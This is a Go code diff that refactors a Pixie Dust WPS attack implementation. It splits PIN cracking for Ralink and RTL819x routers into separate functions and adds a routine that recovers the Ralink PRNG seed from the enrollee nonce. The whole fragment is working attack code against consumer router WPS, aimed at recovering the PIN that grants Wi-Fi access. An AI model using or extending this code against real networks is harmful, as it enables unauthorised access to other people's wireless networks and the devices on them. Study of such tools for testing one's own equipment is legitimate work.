@@ -24,21 +24,73 @@ func (pda *pixieDustAttack) trySpecialCases() {
 
     // ES1 = ES2 = 0
     if !pda.isRTL819x {
-        if pin, _, _, err := pda.crack(); err == nil {
-            pda.foundMode = rt
-            pda.pin = pin
-            return true
-        }
+        pda.ralinkRT()  // it can stop here if true
     }
 
     // ES1 = ES2 = E-Nonce
-    pda.eSecret1 = append([]byte(nil), pda.eNonce...)
-    pda.eSecret2 = append([]byte(nil), pda.eNonce...)
-    if pin, _, _, err := pda.crack(); err == nil {
-        pda.foundMode = rtl819x
-        pda.pin = pin
-        return true
+    pda.lazyRTL819x()
+}
+
+
+
+func (pda *pixieDustAttack) ralinkRT() {
+    pda.crackFirstHalf([]byte{})
+    pda.crackSecondHalf()
+    
+    if !pda.pinFound() {
+        return
     }
 
-    return false
+    pda.recoverRalinkSeed()
+    pda.foundMode = rt
+    pda.displayPIN()
+}
+
+
+
+func (pda *pixieDustAttack) recoverRalinkSeed() {
+    if len(pda.eNonce) < wpsNonceLen { 
+        pda.nonceSeed = 0
+        return
+    }
+
+    var sreg uint32  = 0
+    lenENonce       := len(pda.eNonce)
+
+    for i := lenENonce - 1; i >= 0; i-- {
+        sreg = ralinkRandStateRestore(sreg, pda.eNonce[i])
+    }
+
+    pda.nonceSeed = sreg
+}
+
+
+
+func ralinkRandStateRestore(sreg uint32, r byte) uint32 {
+    for range 8 {
+        result := r & 1
+        r >>= 1
+        
+        if result != 0 {
+            sreg = ((sreg << 1) ^ 0x80000057) | 0x00000001
+        } else {
+            sreg = sreg << 1
+        }
+    }
+
+    return sreg
+}
+
+
+
+func (pda *pixieDustAttack) lazyRTL819x() {
+    pda.crackFirstHalf([]byte{})
+    pda.crackSecondHalf()
+
+    if !pda.pinFound() {
+        return
+    }
+
+    pda.foundMode = rtl819x
+    pda.displayPIN()
 }
